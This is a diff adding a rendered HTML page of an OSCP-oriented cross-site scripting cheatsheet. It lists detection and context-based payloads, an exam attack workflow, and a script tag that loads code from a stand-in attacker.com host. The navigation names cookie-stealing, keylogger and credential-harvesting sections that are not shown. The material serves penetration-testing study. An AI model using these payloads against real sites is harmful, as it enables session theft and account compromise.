+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#basic-alert-payloads" class="md-nav__link">
+    <span class="md-ellipsis">
+      Basic Alert Payloads
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#quick-detection" class="md-nav__link">
+    <span class="md-ellipsis">
+      Quick Detection
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#oscp-exam-attack-workflow" class="md-nav__link">
+    <span class="md-ellipsis">
+      OSCP Exam Attack Workflow
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="OSCP Exam Attack Workflow">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#phase-1-identify-injection-points-2-5-min" class="md-nav__link">
+    <span class="md-ellipsis">
+      Phase 1: Identify Injection Points (2-5 min)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#phase-2-test-filter-bypass-5-10-min" class="md-nav__link">
+    <span class="md-ellipsis">
+      Phase 2: Test Filter Bypass (5-10 min)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#phase-3-craft-working-payload-5-15-min" class="md-nav__link">
+    <span class="md-ellipsis">
+      Phase 3: Craft Working Payload (5-15 min)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#phase-4-exploit-for-exam-points-10-20-min" class="md-nav__link">
+    <span class="md-ellipsis">
+      Phase 4: Exploit for Exam Points (10-20 min)
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#context-based-payloads" class="md-nav__link">
+    <span class="md-ellipsis">
+      Context-Based Payloads
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Context-Based Payloads">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#html-context" class="md-nav__link">
+    <span class="md-ellipsis">
+      HTML Context
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attribute-context" class="md-nav__link">
+    <span class="md-ellipsis">
+      Attribute Context
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#javascript-context" class="md-nav__link">
+    <span class="md-ellipsis">
+      JavaScript Context
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#url-context" class="md-nav__link">
+    <span class="md-ellipsis">
+      URL Context
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#filter-bypass-techniques" class="md-nav__link">
+    <span class="md-ellipsis">
+      Filter Bypass Techniques
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Filter Bypass Techniques">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-case-manipulation" class="md-nav__link">
+    <span class="md-ellipsis">
+      1. Case Manipulation
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-encoding" class="md-nav__link">
+    <span class="md-ellipsis">
+      2. Encoding
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-tag-variations" class="md-nav__link">
+    <span class="md-ellipsis">
+      3. Tag Variations
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4-bypassing-keyword-filters" class="md-nav__link">
+    <span class="md-ellipsis">
+      4. Bypassing Keyword Filters
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#5-comment-tricks" class="md-nav__link">
+    <span class="md-ellipsis">
+      5. Comment Tricks
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#6-null-byte-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      6. Null Byte Injection
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#polyglot-payloads" class="md-nav__link">
+    <span class="md-ellipsis">
+      Polyglot Payloads
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#oscp-specific-exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
+      OSCP-Specific Exploitation
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="OSCP-Specific Exploitation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-cookie-stealing" class="md-nav__link">
+    <span class="md-ellipsis">
+      1. Cookie Stealing
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-session-hijacking" class="md-nav__link">
+    <span class="md-ellipsis">
+      2. Session Hijacking
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-keylogger" class="md-nav__link">
+    <span class="md-ellipsis">
+      3. Keylogger
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4-credential-harvesting" class="md-nav__link">
+    <span class="md-ellipsis">
+      4. Credential Harvesting
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#5-phishing-page-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      5. Phishing Page Injection
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#6-beef-hook" class="md-nav__link">
+    <span class="md-ellipsis">
+      6. BeEF Hook
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#7-admin-action-exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
+      7. Admin Action Exploitation
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#testing-methodology" class="md-nav__link">
+    <span class="md-ellipsis">
+      Testing Methodology
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Testing Methodology">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#step-1-map-input-points" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 1: Map Input Points
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-2-test-basic-payloads" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 2: Test Basic Payloads
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-3-determine-context" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 3: Determine Context
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-4-bypass-filters" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 4: Bypass Filters
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-5-craft-final-exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 5: Craft Final Exploit
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tools-for-xss-testing" class="md-nav__link">
+    <span class="md-ellipsis">
+      Tools for XSS Testing
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Tools for XSS Testing">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#manual-testing" class="md-nav__link">
+    <span class="md-ellipsis">
+      Manual Testing
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#automated-tools" class="md-nav__link">
+    <span class="md-ellipsis">
+      Automated Tools
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#common-injection-points" class="md-nav__link">
+    <span class="md-ellipsis">
+      Common Injection Points
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Common Injection Points">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#url-parameters" class="md-nav__link">
+    <span class="md-ellipsis">
+      URL Parameters
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#form-inputs" class="md-nav__link">
+    <span class="md-ellipsis">
+      Form Inputs
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#http-headers" class="md-nav__link">
+    <span class="md-ellipsis">
+      HTTP Headers
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#file-uploads" class="md-nav__link">
+    <span class="md-ellipsis">
+      File Uploads
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#waf-bypass-techniques" class="md-nav__link">
+    <span class="md-ellipsis">
+      WAF Bypass Techniques
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="WAF Bypass Techniques">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-character-encoding-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      1. Character Encoding Bypass
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-mixed-case" class="md-nav__link">
+    <span class="md-ellipsis">
+      2. Mixed Case
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-uncommon-tags" class="md-nav__link">
+    <span class="md-ellipsis">
+      3. Uncommon Tags
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4-obfuscation" class="md-nav__link">
+    <span class="md-ellipsis">
+      4. Obfuscation
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#quick-payload-reference" class="md-nav__link">
+    <span class="md-ellipsis">
+      Quick Payload Reference
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Quick Payload Reference">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#shortest-payloads" class="md-nav__link">
+    <span class="md-ellipsis">
+      Shortest Payloads
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cookie-stealers" class="md-nav__link">
+    <span class="md-ellipsis">
+      Cookie Stealers
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#keyloggers" class="md-nav__link">
+    <span class="md-ellipsis">
+      Keyloggers
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#page-redirectors" class="md-nav__link">
+    <span class="md-ellipsis">
+      Page Redirectors
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#oscp-exam-strategy" class="md-nav__link">
+    <span class="md-ellipsis">
+      OSCP Exam Strategy
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="OSCP Exam Strategy">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#time-management" class="md-nav__link">
+    <span class="md-ellipsis">
+      Time Management
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#checklist-during-exam" class="md-nav__link">
+    <span class="md-ellipsis">
+      Checklist During Exam
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pro-tips-for-oscp" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pro Tips for OSCP
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#practice-resources" class="md-nav__link">
+    <span class="md-ellipsis">
+      Practice Resources
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Practice Resources">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#online-labs" class="md-nav__link">
+    <span class="md-ellipsis">
+      Online Labs
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#payload-lists" class="md-nav__link">
+    <span class="md-ellipsis">
+      Payload Lists
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#summary" class="md-nav__link">
+    <span class="md-ellipsis">
+      Summary
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Summary">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#remember" class="md-nav__link">
+    <span class="md-ellipsis">
+      Remember:
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#quick-command-reference" class="md-nav__link">
+    <span class="md-ellipsis">
+      Quick Command Reference
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="cross-site-scripting-xss">Cross-Site Scripting (XSS)</h1>
+<h2 id="overview">Overview</h2>
+<p>Cross-Site Scripting (XSS) allows attackers to inject malicious scripts into web pages viewed by other users. This cheatsheet covers practical XSS techniques for OSCP exam scenarios.</p>
+<hr />
+<h2 id="quick-detection-checklist">Quick Detection Checklist</h2>
+<ul>
+<li>[ ] Test all input fields (search, comments, forms)</li>
+<li>[ ] Check URL parameters and fragments</li>
+<li>[ ] Test HTTP headers (User-Agent, Referer, Cookie)</li>
+<li>[ ] Look for reflected input in HTML, JavaScript, attributes</li>
+<li>[ ] Check for stored XSS in profiles, comments, messages</li>
+<li>[ ] Test file upload features (filename, content)</li>
+<li>[ ] Examine DOM-based sinks (innerHTML, eval, document.write)</li>
+</ul>
+<hr />
+<h2 id="xss-types">XSS Types</h2>
+<h3 id="1-reflected-xss">1. Reflected XSS</h3>
+<p><strong>Payload is reflected immediately in the response</strong>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>Victim clicks malicious link → Server reflects payload → Executes in browser
+</span></code></pre></div></p>
+<h3 id="2-stored-xss">2. Stored XSS</h3>
+<p><strong>Payload is stored on server and served to multiple users</strong>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>Attacker stores payload → Server saves to database → Other users view page → Executes
+</span></code></pre></div></p>
+<h3 id="3-dom-based-xss">3. DOM-Based XSS</h3>
+<p><strong>Payload executes through DOM manipulation</strong>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>Payload in URL fragment → JavaScript processes it → Executes without server interaction
+</span></code></pre></div></p>
+<hr />
+<h2 id="basic-detection-payloads">Basic Detection Payloads</h2>
+<h3 id="simple-test-characters">Simple Test Characters</h3>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="err">&lt;</span> &gt; &#39; &quot; { } ;
+</span></code></pre></div>
+<h3 id="basic-alert-payloads">Basic Alert Payloads</h3>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;XSS&#39;</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">domain</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">confirm</span><span class="p">(</span><span class="mf">1</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">prompt</span><span class="p">(</span><span class="mf">1</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></code></pre></div>
+<h3 id="quick-detection">Quick Detection</h3>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">x</span> <span class="na">onerror</span><span class="o">=</span><span class="s">alert(1)</span><span class="p">&gt;</span>
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="p">&lt;</span><span class="nt">svg</span> <span class="na">onload</span><span class="o">=</span><span class="s">alert(1)</span><span class="p">&gt;</span>
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="p">&lt;</span><span class="nt">body</span> <span class="na">onload</span><span class="o">=</span><span class="s">alert(1)</span><span class="p">&gt;</span>
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;javascript:alert(1)&quot;</span><span class="p">&gt;</span>
+</span></code></pre></div>
+<hr />
+<h2 id="oscp-exam-attack-workflow">OSCP Exam Attack Workflow</h2>
+<h3 id="phase-1-identify-injection-points-2-5-min">Phase 1: Identify Injection Points (2-5 min)</h3>
+<ul>
+<li>
+<p>[ ] <strong>URL Parameters</strong>
+  <div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>http://target.com/page?name=&lt;script&gt;alert(1)&lt;/script&gt;
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>http://target.com/search?q=&lt;img src=x onerror=alert(1)&gt;
+</span></code></pre></div></p>
+</li>
+<li>
+<p>[ ] <strong>Form Fields</strong>
+  <div class="language-html highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>Name: <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>Comment: <span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">x</span> <span class="na">onerror</span><span class="o">=</span><span class="s">alert(1)</span><span class="p">&gt;</span>
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>Email: test@test.com&quot;&gt;<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></code></pre></div></p>
+</li>
+<li>
+<p>[ ] <strong>HTTP Headers</strong>
+  <div class="language-bash highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>curl<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;User-Agent: &lt;script&gt;alert(1)&lt;/script&gt;&quot;</span><span class="w"> </span>http://target.com
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>curl<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Referer: &lt;script&gt;alert(1)&lt;/script&gt;&quot;</span><span class="w"> </span>http://target.com
+</span></code></pre></div></p>
+</li>
+</ul>
+<h3 id="phase-2-test-filter-bypass-5-10-min">Phase 2: Test Filter Bypass (5-10 min)</h3>
+<ul>
+<li>[ ] Try basic payload first</li>
+<li>[ ] If blocked, test character encoding</li>
+<li>[ ] Try tag variations</li>
+<li>[ ] Test case manipulation</li>
+<li>[ ] Use event handlers</li>
+<li>[ ] Try polyglot payloads</li>
+</ul>
+<h3 id="phase-3-craft-working-payload-5-15-min">Phase 3: Craft Working Payload (5-15 min)</h3>
+<ul>
+<li>[ ] Start with simple <code>alert(1)</code></li>
+<li>[ ] Adjust based on context (HTML, attribute, JavaScript)</li>
+<li>[ ] Bypass filters if needed</li>
+<li>[ ] Test payload thoroughly</li>
+</ul>
+<h3 id="phase-4-exploit-for-exam-points-10-20-min">Phase 4: Exploit for Exam Points (10-20 min)</h3>
+<ul>
+<li>[ ] Steal cookies/session tokens</li>
+<li>[ ] Capture credentials</li>
+<li>[ ] Perform actions as victim</li>
+<li>[ ] Document findings for report</li>
+</ul>
+<hr />
+<h2 id="context-based-payloads">Context-Based Payloads</h2>
+<h3 id="html-context">HTML Context</h3>
+<p><strong>Input reflected directly in HTML body</strong></p>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="cm">&lt;!-- Basic --&gt;</span>
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">domain</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a><span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">http://attacker.com/evil.js</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>
+</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a><span class="cm">&lt;!-- Image Tags --&gt;</span>
+</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">x</span> <span class="na">onerror</span><span class="o">=</span><span class="s">alert(1)</span><span class="p">&gt;</span>
+</span><span id="__span-9-8"><a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">x</span> <span class="na">onerror</span><span class="o">=</span><span class="s">alert(document.cookie)</span><span class="p">&gt;</span>
+</span><span id="__span-9-9"><a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a><span class="p">&lt;</span><span class="nt">img</span><span class="err">/</span><span class="na">src</span><span class="o">=</span><span class="s">x</span> <span class="na">onerror</span><span class="o">=</span><span class="s">alert(1)</span><span class="p">&gt;</span>
+</span><span id="__span-9-10"><a id="__codelineno-9-10" name="__codelineno-9-10" href="#__codelineno-9-10"></a>
+</span><span id="__span-9-11"><a id="__codelineno-9-11" name="__codelineno-9-11" href="#__codelineno-9-11"></a><span class="cm">&lt;!-- SVG --&gt;</span>
+</span><span id="__span-9-12"><a id="__codelineno-9-12" name="__codelineno-9-12" href="#__codelineno-9-12"></a><span class="p">&lt;</span><span class="nt">svg</span> <span class="na">onload</span><span class="o">=</span><span class="s">alert(1)</span><span class="p">&gt;</span>
+</span><span id="__span-9-13"><a id="__codelineno-9-13" name="__codelineno-9-13" href="#__codelineno-9-13"></a><span class="p">&lt;</span><span class="nt">svg</span><span class="err">/</span><span class="na">onload</span><span class="o">=</span><span class="s">alert(1)</span><span class="p">&gt;</span>
+</span><span id="__span-9-14"><a id="__codelineno-9-14" name="__codelineno-9-14" href="#__codelineno-9-14"></a><span class="p">&lt;</span><span class="nt">svg</span><span class="p">&gt;&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;&lt;/</span><span class="nt">svg</span><span class="p">&gt;</span>
+</span><span id="__span-9-15"><a id="__codelineno-9-15" name="__codelineno-9-15" href="#__codelineno-9-15"></a><span class="p">&lt;</span><span class="nt">svg</span><span class="p">&gt;&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="o">&amp;</span><span class="err">#</span><span class="mf">40</span><span class="p">;</span><span class="mf">1</span><span class="o">&amp;</span><span class="err">#</span><span class="mf">41</span><span class="p">;&lt;/</span><span class="nt">script</span><span class="p">&gt;&lt;/</span><span class="nt">svg</span><span class="p">&gt;</span>
+</span><span id="__span-9-16"><a id="__codelineno-9-16" name="__codelineno-9-16" href="#__codelineno-9-16"></a>
+</span><span id="__span-9-17"><a id="__codelineno-9-17" name="__codelineno-9-17" href="#__codelineno-9-17"></a><span class="cm">&lt;!-- Body/HTML Tags --&gt;</span>
+</span><span id="__span-9-18"><a id="__codelineno-9-18" name="__codelineno-9-18" href="#__codelineno-9-18"></a><span class="p">&lt;</span><span class="nt">body</span> <span class="na">onload</span><span class="o">=</span><span class="s">alert(1)</span><span class="p">&gt;</span>
+</span><span id="__span-9-19"><a id="__codelineno-9-19" name="__codelineno-9-19" href="#__codelineno-9-19"></a><span class="p">&lt;</span><span class="nt">body</span> <span class="na">onpageshow</span><span class="o">=</span><span class="s">alert(1)</span><span class="p">&gt;</span>
+</span><span id="__span-9-20"><a id="__codelineno-9-20" name="__codelineno-9-20" href="#__codelineno-9-20"></a><span class="p">&lt;</span><span class="nt">html</span> <span class="na">onmouseover</span><span class="o">=</span><span class="s">alert(1)</span><span class="p">&gt;</span>
+</span><span id="__span-9-21"><a id="__codelineno-9-21" name="__codelineno-9-21" href="#__codelineno-9-21"></a>
+</span><span id="__span-9-22"><a id="__codelineno-9-22" name="__codelineno-9-22" href="#__codelineno-9-22"></a><span class="cm">&lt;!-- IFrame --&gt;</span>
+</span><span id="__span-9-23"><a id="__codelineno-9-23" name="__codelineno-9-23" href="#__codelineno-9-23"></a><span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;javascript:alert(1)&quot;</span><span class="p">&gt;</span>
+</span><span id="__span-9-24"><a id="__codelineno-9-24" name="__codelineno-9-24" href="#__codelineno-9-24"></a><span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">src</span><span class="o">=</span><span class="s">data:text/html,&lt;script</span><span class="p">&gt;</span>alert(1)<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>&gt;
+</span><span id="__span-9-25"><a id="__codelineno-9-25" name="__codelineno-9-25" href="#__codelineno-9-25"></a><span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">srcdoc</span><span class="o">=</span><span class="s">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span><span class="p">&gt;</span>
+</span></code></pre></div>
+<h3 id="attribute-context">Attribute Context</h3>
+<p><strong>Input reflected inside HTML attribute</strong></p>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="cm">&lt;!-- Breaking out of attribute --&gt;</span>
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>&quot;&gt;<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>&#39; onmouseover=&#39;alert(1)
+</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>&quot; onmouseover=&quot;alert(1)
+</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>&quot; onfocus=&quot;alert(1)&quot; autofocus=&quot;
+</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a>&#39; onfocus=&#39;alert(1)&#39; autofocus=&#39;
+</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a>
+</span><span id="__span-10-8"><a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a><span class="cm">&lt;!-- Without breaking attribute --&gt;</span>
